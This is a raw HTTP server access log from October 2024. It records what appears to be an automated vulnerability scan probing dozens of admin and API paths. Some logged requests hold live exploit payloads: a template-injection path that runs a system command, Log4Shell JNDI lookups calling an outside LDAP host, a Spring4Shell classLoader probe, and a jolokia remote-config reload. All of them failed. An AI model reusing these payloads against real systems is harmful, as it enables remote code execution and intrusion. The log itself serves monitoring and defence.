2024-10-09 17:01:36,448.448 INFO [Thread-462 (process_request_thread)] [_internal.py:97] - 10.185.64.144 - - [09/Oct/2024 17:01:36] "[31m[1m\x00\x00\x00\x1f\x00\x00\x00\x00\x00\x00\x00\x0cGetClassName\x00\x00\x00\x02\x04\x00\x00\x00\x00\x01\x00[0m" 400 -
2024-10-09 17:01:36,461.461 INFO [Thread-464 (process_request_thread)] [_internal.py:97] - 10.185.64.144 - - [09/Oct/2024 17:01:36] "[33mGET / HTTP/1.1[0m" 404 -
2024-10-09 17:05:04,103.103 INFO [Thread-465 (process_request_thread)] [_internal.py:97] - 10.185.64.144 - - [09/Oct/2024 17:05:04] "[33mGET / HTTP/1.1[0m" 404 -
2024-10-09 17:05:24,704.704 INFO [Thread-466 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [09/Oct/2024 17:05:24] "[33mGET / HTTP/1.1[0m" 404 -
2024-10-09 17:05:24,719.719 INFO [Thread-467 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [09/Oct/2024 17:05:24] "[33mGET /LyhFHDU5 HTTP/1.1[0m" 404 -
2024-10-09 17:05:24,735.735 INFO [Thread-468 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [09/Oct/2024 17:05:24] "[33mGET /version HTTP/1.1[0m" 404 -
2024-10-09 17:05:24,754.754 INFO [Thread-469 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [09/Oct/2024 17:05:24] "[33mGET /swagger-ui.html HTTP/1.1[0m" 404 -
2024-10-09 17:05:24,770.770 INFO [Thread-470 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [09/Oct/2024 17:05:24] "[33mGET /ui/ HTTP/1.1[0m" 404 -
2024-10-09 17:05:24,989.989 INFO [Thread-471 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [09/Oct/2024 17:05:24] "[33mGET /healthz HTTP/1.1[0m" 404 -
2024-10-09 17:05:25,107.107 INFO [Thread-472 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [09/Oct/2024 17:05:25] "[33mGET /services/Version HTTP/1.1[0m" 404 -
2024-10-09 17:05:25,325.325 INFO [Thread-473 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [09/Oct/2024 17:05:25] "[33mGET /nmc/login HTTP/1.1[0m" 404 -
2024-10-09 17:05:25,543.543 INFO [Thread-474 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [09/Oct/2024 17:05:25] "[33mGET /login HTTP/1.1[0m" 404 -
2024-10-09 17:05:25,761.761 INFO [Thread-475 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [09/Oct/2024 17:05:25] "[33mGET /swagger/ HTTP/1.1[0m" 404 -
2024-10-09 17:05:25,978.978 INFO [Thread-476 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [09/Oct/2024 17:05:25] "[33mGET /swagger.yaml HTTP/1.1[0m" 404 -
2024-10-09 17:05:26,201.201 INFO [Thread-477 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [09/Oct/2024 17:05:26] "[33mGET /cas HTTP/1.1[0m" 404 -
2024-10-09 17:05:26,317.317 INFO [Thread-478 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [09/Oct/2024 17:05:26] "[33mGET /nexus/ HTTP/1.1[0m" 404 -
2024-10-09 17:05:26,534.534 INFO [Thread-479 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [09/Oct/2024 17:05:26] "[33mGET /login.html HTTP/1.1[0m" 404 -
2024-10-09 17:05:26,752.752 INFO [Thread-480 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [09/Oct/2024 17:05:26] "[33mGET /swagger-ui/ HTTP/1.1[0m" 404 -
2024-10-09 17:05:26,970.970 INFO [Thread-481 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [09/Oct/2024 17:05:26] "[33mGET /dfshealth.html HTTP/1.1[0m" 404 -
2024-10-09 17:05:27,188.188 INFO [Thread-482 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [09/Oct/2024 17:05:27] "[33mGET /devices HTTP/1.1[0m" 404 -
2024-10-09 17:05:27,306.306 INFO [Thread-483 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [09/Oct/2024 17:05:27] "[33mGET /docs HTTP/1.1[0m" 404 -
2024-10-09 17:05:27,534.534 INFO [Thread-484 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [09/Oct/2024 17:05:27] "[33mGET /api/docs HTTP/1.1[0m" 404 -
2024-10-09 17:05:27,751.751 INFO [Thread-485 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [09/Oct/2024 17:05:27] "[33mGET /swagger.json HTTP/1.1[0m" 404 -
2024-10-09 17:05:27,969.969 INFO [Thread-486 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [09/Oct/2024 17:05:27] "[33mGET /user-login.html HTTP/1.1[0m" 404 -
2024-10-09 17:05:28,186.186 INFO [Thread-487 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [09/Oct/2024 17:05:28] "[33mGET /png/ HTTP/1.1[0m" 404 -
2024-10-09 17:05:28,403.403 INFO [Thread-488 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [09/Oct/2024 17:05:28] "[33mGET /cas/login HTTP/1.1[0m" 404 -
2024-10-09 17:05:28,521.521 INFO [Thread-489 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [09/Oct/2024 17:05:28] "[33mGET /k3cloud/ HTTP/1.1[0m" 404 -
2024-10-09 17:05:28,739.739 INFO [Thread-490 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [09/Oct/2024 17:05:28] "[33mGET /?query= HTTP/1.1[0m" 404 -
2024-10-09 17:05:28,957.957 INFO [Thread-491 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [09/Oct/2024 17:05:28] "[33mGET /ws/v1/cluster/info HTTP/1.1[0m" 404 -
2024-10-09 17:05:29,173.173 INFO [Thread-492 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [09/Oct/2024 17:05:29] "[33mGET /clickhouse/data/query HTTP/1.1[0m" 404 -
2024-10-09 17:05:29,393.393 INFO [Thread-493 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [09/Oct/2024 17:05:29] "[33mGET /v2/api-docs/ HTTP/1.1[0m" 404 -
2024-10-09 17:05:29,511.511 INFO [Thread-494 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [09/Oct/2024 17:05:29] "[33mGET /dsview/protected/login.do HTTP/1.1[0m" 404 -
2024-10-09 17:05:29,728.728 INFO [Thread-495 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [09/Oct/2024 17:05:29] "[33mGET /swagger/index.html HTTP/1.1[0m" 404 -
2024-10-09 17:05:29,968.968 INFO [Thread-496 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [09/Oct/2024 17:05:29] "[33mGET /webapps/primus/ HTTP/1.1[0m" 404 -
2024-10-09 17:05:30,195.195 INFO [Thread-497 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [09/Oct/2024 17:05:30] "[33mGET /core/auth/login/ HTTP/1.1[0m" 404 -
2024-10-09 17:05:30,314.314 INFO [Thread-498 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [09/Oct/2024 17:05:30] "[33mGET /doc/index.html HTTP/1.1[0m" 404 -
2024-10-09 17:05:30,532.532 INFO [Thread-499 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [09/Oct/2024 17:05:30] "[33mGET /nacos/ HTTP/1.1[0m" 404 -
2024-10-09 17:05:30,751.751 INFO [Thread-500 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [09/Oct/2024 17:05:30] "[33mGET /index?as_more HTTP/1.1[0m" 404 -
2024-10-09 17:05:30,994.994 INFO [Thread-501 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [09/Oct/2024 17:05:30] "[33mGET /unified-console.html HTTP/1.1[0m" 404 -
2024-10-09 17:05:31,112.112 INFO [Thread-502 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [09/Oct/2024 17:05:31] "[33mGET /static/apidoc/ HTTP/1.1[0m" 404 -
2024-10-09 17:05:31,330.330 INFO [Thread-503 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [09/Oct/2024 17:05:31] "[33mGET /jenkins HTTP/1.1[0m" 404 -
2024-10-09 17:05:31,548.548 INFO [Thread-504 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [09/Oct/2024 17:05:31] "[33mGET /zabbix HTTP/1.1[0m" 404 -
2024-10-09 17:05:31,765.765 INFO [Thread-505 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [09/Oct/2024 17:05:31] "[33mGET /api-docs/ HTTP/1.1[0m" 404 -
2024-10-09 17:05:31,985.985 INFO [Thread-506 (process_request_thread)] [_internal.py:97] - 10.185.3.109 - - [09/Oct/2024 17:05:31] "[33mGET /swagger/swagger-ui.html HTTP/1.1[0m" 404 -
2024-10-09 17:05:34,270.270 INFO [Thread-507 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [09/Oct/2024 17:05:34] "[31m[1mGET /console HTTP/1.1[0m" 400 -
2024-10-09 17:05:34,613.613 INFO [Thread-508 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [09/Oct/2024 17:05:34] "[33mGET /__${new%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x HTTP/1.1[0m" 404 -
2024-10-09 17:05:34,794.794 INFO [Thread-509 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [09/Oct/2024 17:05:34] "[33mGET / HTTP/1.1[0m" 404 -
2024-10-09 17:05:34,809.809 INFO [Thread-510 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [09/Oct/2024 17:05:34] "[33mGET / HTTP/1.1[0m" 404 -
2024-10-09 17:05:34,824.824 INFO [Thread-511 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [09/Oct/2024 17:05:34] "[33mGET /${jndi:ldap://cn.oast-cn.byted-dast.com/realtime/active-scan-cn/deserialization/log4j2/bkx6l6oyt3mxh4ec} HTTP/1.1[0m" 404 -
2024-10-09 17:05:34,837.837 INFO [Thread-512 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [09/Oct/2024 17:05:34] "[33mGET /?${jndi:ldap://cn.oast-cn.byted-dast.com/realtime/active-scan-cn/deserialization/log4j2/bkx6l6oyt3mxh4ec} HTTP/1.1[0m" 404 -
2024-10-09 17:05:34,852.852 INFO [Thread-513 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [09/Oct/2024 17:05:34] "[33mPOST / HTTP/1.1[0m" 404 -
2024-10-09 17:05:34,866.866 INFO [Thread-514 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [09/Oct/2024 17:05:34] "[33mPUT / HTTP/1.1[0m" 404 -
2024-10-09 17:05:38,015.015 INFO [Thread-515 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [09/Oct/2024 17:05:38] "[33mGET /actuator/jolokia/list/ HTTP/1.1[0m" 404 -
2024-10-09 17:05:38,033.033 INFO [Thread-516 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [09/Oct/2024 17:05:38] "[33mGET /jolokia/list/ HTTP/1.1[0m" 404 -
2024-10-09 17:05:38,276.276 INFO [Thread-517 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [09/Oct/2024 17:05:38] "[33mGET / HTTP/1.1[0m" 404 -
2024-10-09 17:05:38,293.293 INFO [Thread-518 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [09/Oct/2024 17:05:38] "[33mGET /h2-console HTTP/1.1[0m" 404 -
2024-10-09 17:05:39,297.297 INFO [Thread-519 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [09/Oct/2024 17:05:39] "[33mGET /xxl-job-admin/api HTTP/1.1[0m" 404 -
2024-10-09 17:05:39,316.316 INFO [Thread-520 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [09/Oct/2024 17:05:39] "[33mGET /api HTTP/1.1[0m" 404 -
2024-10-09 17:05:39,330.330 INFO [Thread-521 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [09/Oct/2024 17:05:39] "[33mGET /ea-job-admin/api HTTP/1.1[0m" 404 -
2024-10-09 17:05:39,403.403 INFO [Thread-522 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [09/Oct/2024 17:05:39] "[33mGET / HTTP/1.1[0m" 404 -
2024-10-09 17:05:39,851.851 INFO [Thread-523 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [09/Oct/2024 17:05:39] "[33mGET /?class.module.classLoader[0]=test HTTP/1.1[0m" 404 -
2024-10-09 17:05:39,973.973 INFO [Thread-524 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [09/Oct/2024 17:05:39] "[33mGET / HTTP/1.1[0m" 404 -
2024-10-09 17:05:39,991.991 INFO [Thread-525 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [09/Oct/2024 17:05:39] "[33mGET /h2-console HTTP/1.1[0m" 404 -
2024-10-09 17:05:40,545.545 ERROR [Thread-526 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [09/Oct/2024 17:05:40] code 400, message Bad request version ("g¡¾oGU\x058LSØ«n\x00V\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00\x9f\x00\x9eÌªÀ¯À\xadÀ®À¬À$À(À#À'À")
2024-10-09 17:05:40,545.545 INFO [Thread-526 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [09/Oct/2024 17:05:40] "[31m[1m\x16\x03\x01\x01G\x01\x00\x01C\x03\x03\x02;GÈÙ\x87ú+Ó\x8a\x8a\x9f;Ï­l£\x01çå\x87]fQ\x99\x1cbx%í7, +±¡Ü¯'¤övF\x84ò\x87+¨\x85F°\x85g¡¾oGU\x058LSØ«n\x00V\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00\x9f\x00\x9eÌªÀ¯À­À®À¬À$À(À#À'À[0m" 400 -
2024-10-09 17:05:40,671.671 INFO [Thread-527 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [09/Oct/2024 17:05:40] "[33mGET /v1/agent/self HTTP/1.1[0m" 404 -
2024-10-09 17:05:41,347.347 INFO [Thread-528 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [09/Oct/2024 17:05:41] "[33mGET / HTTP/1.1[0m" 404 -
2024-10-09 17:05:41,418.418 INFO [Thread-529 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [09/Oct/2024 17:05:41] "[33mPOST / HTTP/1.1[0m" 404 -
2024-10-09 17:05:41,435.435 INFO [Thread-530 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [09/Oct/2024 17:05:41] "[33mPOST /login HTTP/1.1[0m" 404 -
2024-10-09 17:05:41,450.450 INFO [Thread-531 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [09/Oct/2024 17:05:41] "[33mPOST /cas/login HTTP/1.1[0m" 404 -
2024-10-09 17:05:41,843.843 INFO [Thread-532 (process_request_thread)] [_internal.py:97] - 10.185.44.118 - - [09/Oct/2024 17:05:41] "[33mGET /jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/127.0.0.1:22222!/logback.xml HTTP/1.1[0m" 404 -
2024-10-19 17:37:13,153.153 ERROR [Thread-533 (process_request_thread)] [_internal.py:97] - 10.185.38.78 - - [19/Oct/2024 17:37:13] code 400, message Bad request version ('\x00{\x000\x000\x000\x000\x00A\x00A\x000\x000\x00-\x000\x00A\x000\x000\x00-\x000\x000\x00a\x000\x00-\x00A\x00A\x000\x00A\x00-\x000\x000\x000\x000\x00A\x000\x00A\x00A\x000\x00A\x00A\x000\x00}\x00\x00\x00àmß_')
2024-10-19 17:37:13,153.153 INFO [Thread-533 (process_request_thread)] [_internal.py:97] - 10.185.38.78 - - [19/Oct/2024 17:37:13] "[31m[1m\x01\x00\x00ýÎú\x0b° \x00\x00\x00MMS\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x12\x00\x00\x00\x01\x00\x03\x00ðððð\x0b\x00\x04\x00\x1c\x00\x03\x00N\x00S\x00P\x00l\x00a\x00y\x00e\x00r\x00/\x009\x00.\x000\x00.\x000\x00.\x002\x009\x008\x000\x00;\x00 \x00{\x000\x000\x000\x000\x00A\x00A\x000\x000\x00-\x000\x00A\x000\x000\x00-\x000\x000\x00a\x000\x00-\x00A\x00A\x000\x00A\x00-\x000\x000\x000\x000\x00A\x000\x00A\x00A\x000\x00A\x00A\x000\x00}\x00\x00\x00àmß_[0m" 400 -
2024-10-19 17:37:18,161.161 ERROR [Thread-534 (process_request_thread)] [_internal.py:97] - 10.185.38.78 - - [19/Oct/2024 17:37:18] code 400, message Bad request version ('GetClassName\x00\x00\x00\x02\x04\x00\x00\x00\x00\x01\x00')
2024-10-19 17:37:18,162.162 INFO [Thread-534 (process_request_thread)] [_internal.py:97] - 10.185.38.78 - - [19/Oct/2024 17:37:18] "[31m[1m\x00\x00\x00\x1f\x00\x00\x00\x00\x00\x00\x00\x0cGetClassName\x00\x00\x00\x02\x04\x00\x00\x00\x00\x01\x00[0m" 400 -
2024-10-19 17:37:18,176.176 INFO [Thread-536 (process_request_thread)] [_internal.py:97] - 10.185.38.78 - - [19/Oct/2024 17:37:18] "[33mGET / HTTP/1.1[0m" 404 -
2024-10-19 17:38:12,285.285 INFO [Thread-537 (process_request_thread)] [_internal.py:97] - 10.185.38.78 - - [19/Oct/2024 17:38:12] "[33mGET / HTTP/1.1[0m" 404 -
2024-10-19 17:41:18,448.448 INFO [Thread-538 (process_request_thread)] [_internal.py:97] - 10.185.40.127 - - [19/Oct/2024 17:41:18] "[33mGET / HTTP/1.1[0m" 404 -
2024-10-19 17:41:18,466.466 INFO [Thread-539 (process_request_thread)] [_internal.py:97] - 10.185.40.127 - - [19/Oct/2024 17:41:18] "[33mGET /n2Jyym5y HTTP/1.1[0m" 404 -
2024-10-19 17:41:18,482.482 INFO [Thread-540 (process_request_thread)] [_internal.py:97] - 10.185.40.127 - - [19/Oct/2024 17:41:18] "[33mGET /cas HTTP/1.1[0m" 404 -
2024-10-19 17:41:18,498.498 INFO [Thread-541 (process_request_thread)] [_internal.py:97] - 10.185.40.127 - - [19/Oct/2024 17:41:18] "[33mGET /swagger.yaml HTTP/1.1[0m" 404 -
2024-10-19 17:41:18,515.515 INFO [Thread-542 (process_request_thread)] [_internal.py:97] - 10.185.40.127 - - [19/Oct/2024 17:41:18] "[33mGET /dsview/protected/login.do HTTP/1.1[0m" 404 -
2024-10-19 17:41:18,732.732 INFO [Thread-543 (process_request_thread)] [_internal.py:97] - 10.185.40.127 - - [19/Oct/2024 17:41:18] "[33mGET /api/docs HTTP/1.1[0m" 404 -
2024-10-19 17:41:18,851.851 INFO [Thread-544 (process_request_thread)] [_internal.py:97] - 10.185.40.127 - - [19/Oct/2024 17:41:18] "[33mGET /swagger-ui/ HTTP/1.1[0m" 404 -
2024-10-19 17:41:19,072.072 INFO [Thread-545 (process_request_thread)] [_internal.py:97] - 10.185.40.127 - - [19/Oct/2024 17:41:19] "[33mGET /login HTTP/1.1[0m" 404 -
2024-10-19 17:41:19,290.290 INFO [Thread-546 (process_request_thread)] [_internal.py:97] - 10.185.40.127 - - [19/Oct/2024 17:41:19] "[33mGET /swagger/swagger-ui.html HTTP/1.1[0m" 404 -
2024-10-19 17:41:19,508.508 INFO [Thread-547 (process_request_thread)] [_internal.py:97] - 10.185.40.127 - - [19/Oct/2024 17:41:19] "[33mGET /nexus/ HTTP/1.1[0m" 404 -
2024-10-19 17:41:19,726.726 INFO [Thread-548 (process_request_thread)] [_internal.py:97] - 10.185.40.127 - - [19/Oct/2024 17:41:19] "[33mGET /unified-console.html HTTP/1.1[0m" 404 -
2024-10-19 17:41:19,946.946 INFO [Thread-549 (process_request_thread)] [_internal.py:97] - 10.185.40.127 - - [19/Oct/2024 17:41:19] "[33mGET /swagger/ HTTP/1.1[0m" 404 -
2024-10-19 17:41:20,065.065 INFO [Thread-550 (process_request_thread)] [_internal.py:97] - 10.185.40.127 - - [19/Oct/2024 17:41:20] "[33mGET /static/apidoc/ HTTP/1.1[0m" 404 -
2024-10-19 17:41:20,283.283 INFO [Thread-551 (process_request_thread)] [_internal.py:97] - 10.185.40.127 - - [19/Oct/2024 17:41:20] "[33mGET /k3cloud/ HTTP/1.1[0m" 404 -
2024-10-19 17:41:20,503.503 INFO [Thread-552 (process_request_thread)] [_internal.py:97] - 10.185.40.127 - - [19/Oct/2024 17:41:20] "[33mGET /services/Version HTTP/1.1[0m" 404 -
2024-10-19 17:41:20,720.720 INFO [Thread-553 (process_request_thread)] [_internal.py:97] - 10.185.40.127 - - [19/Oct/2024 17:41:20] "[33mGET /webapps/primus/ HTTP/1.1[0m" 404 -
2024-10-19 17:41:20,852.852 INFO [Thread-554 (process_request_thread)] [_internal.py:97] - 10.185.40.127 - - [19/Oct/2024 17:41:20] "[33mGET /healthz HTTP/1.1[0m" 404 -
2024-10-19 17:41:21,070.070 INFO [Thread-555 (process_request_thread)] [_internal.py:97] - 10.185.40.127 - - [19/Oct/2024 17:41:21] "[33mGET /nmc/login HTTP/1.1[0m" 404 -
2024-10-19 17:41:21,287.287 INFO [Thread-556 (process_request_thread)] [_internal.py:97] - 10.185.40.127 - - [19/Oct/2024 17:41:21] "[33mGET /swagger.json HTTP/1.1[0m" 404 -
2024-10-19 17:41:21,505.505 INFO [Thread-557 (process_request_thread)] [_internal.py:97] - 10.185.40.127 - - [19/Oct/2024 17:41:21] "[33mGET /ws/v1/cluster/info HTTP/1.1[0m" 404 -
2024-10-19 17:41:21,723.723 INFO [Thread-558 (process_request_thread)] [_internal.py:97] - 10.185.40.127 - - [19/Oct/2024 17:41:21] "[33mGET /index?as_more HTTP/1.1[0m" 404 -
2024-10-19 17:41:21,940.940 INFO [Thread-559 (process_request_thread)] [_internal.py:97] - 10.185.40.127 - - [19/Oct/2024 17:41:21] "[33mGET /clickhouse/data/query HTTP/1.1[0m" 404 -
2024-10-19 17:41:22,060.060 INFO [Thread-560 (process_request_thread)] [_internal.py:97] - 10.185.40.127 - - [19/Oct/2024 17:41:22] "[33mGET /png/ HTTP/1.1[0m" 404 -
2024-10-19 17:41:22,277.277 INFO [Thread-561 (process_request_thread)] [_internal.py:97] - 10.185.40.127 - - [19/Oct/2024 17:41:22] "[33mGET /login.html HTTP/1.1[0m" 404 -
2024-10-19 17:41:22,495.495 INFO [Thread-562 (process_request_thread)] [_internal.py:97] - 10.185.40.127 - - [19/Oct/2024 17:41:22] "[33mGET /dfshealth.html HTTP/1.1[0m" 404 -
2024-10-19 17:41:22,712.712 INFO [Thread-563 (process_request_thread)] [_internal.py:97] - 10.185.40.127 - - [19/Oct/2024 17:41:22] "[33mGET /zabbix HTTP/1.1[0m" 404 -
2024-10-19 17:41:22,930.930 INFO [Thread-564 (process_request_thread)] [_internal.py:97] - 10.185.40.127 - - [19/Oct/2024 17:41:22] "[33mGET /api-docs/ HTTP/1.1[0m" 404 -
2024-10-19 17:41:23,147.147 INFO [Thread-565 (process_request_thread)] [_internal.py:97] - 10.185.40.127 - - [19/Oct/2024 17:41:23] "[33mGET /swagger/index.html HTTP/1.1[0m" 404 -
2024-10-19 17:41:23,264.264 INFO [Thread-566 (process_request_thread)] [_internal.py:97] - 10.185.40.127 - - [19/Oct/2024 17:41:23] "[33mGET /?query= HTTP/1.1[0m" 404 -
2024-10-19 17:41:23,482.482 INFO [Thread-567 (process_request_thread)] [_internal.py:97] - 10.185.40.127 - - [19/Oct/2024 17:41:23] "[33mGET /doc/index.html HTTP/1.1[0m" 404 -
2024-10-19 17:41:23,698.698 INFO [Thread-568 (process_request_thread)] [_internal.py:97] - 10.185.40.127 - - [19/Oct/2024 17:41:23] "[33mGET /ui/ HTTP/1.1[0m" 404 -
2024-10-19 17:41:23,917.917 INFO [Thread-569 (process_request_thread)] [_internal.py:97] - 10.185.40.127 - - [19/Oct/2024 17:41:23] "[33mGET /v2/api-docs/ HTTP/1.1[0m" 404 -
2024-10-19 17:41:24,135.135 INFO [Thread-570 (process_request_thread)] [_internal.py:97] - 10.185.40.127 - - [19/Oct/2024 17:41:24] "[33mGET /swagger-ui.html HTTP/1.1[0m" 404 -
2024-10-19 17:41:24,252.252 INFO [Thread-571 (process_request_thread)] [_internal.py:97] - 10.185.40.127 - - [19/Oct/2024 17:41:24] "[33mGET /docs HTTP/1.1[0m" 404 -
2024-10-19 17:41:24,469.469 INFO [Thread-572 (process_request_thread)] [_internal.py:97] - 10.185.40.127 - - [19/Oct/2024 17:41:24] "[33mGET /nacos/ HTTP/1.1[0m" 404 -
2024-10-19 17:41:24,689.689 INFO [Thread-573 (process_request_thread)] [_internal.py:97] - 10.185.40.127 - - [19/Oct/2024 17:41:24] "[33mGET /jenkins HTTP/1.1[0m" 404 -
2024-10-19 17:41:24,929.929 INFO [Thread-574 (process_request_thread)] [_internal.py:97] - 10.185.40.127 - - [19/Oct/2024 17:41:24] "[33mGET /cas/login HTTP/1.1[0m" 404 -
2024-10-19 17:41:25,149.149 INFO [Thread-575 (process_request_thread)] [_internal.py:97] - 10.185.40.127 - - [19/Oct/2024 17:41:25] "[33mGET /core/auth/login/ HTTP/1.1[0m" 404 -
2024-10-19 17:41:25,267.267 INFO [Thread-576 (process_request_thread)] [_internal.py:97] - 10.185.40.127 - - [19/Oct/2024 17:41:25] "[33mGET /user-login.html HTTP/1.1[0m" 404 -
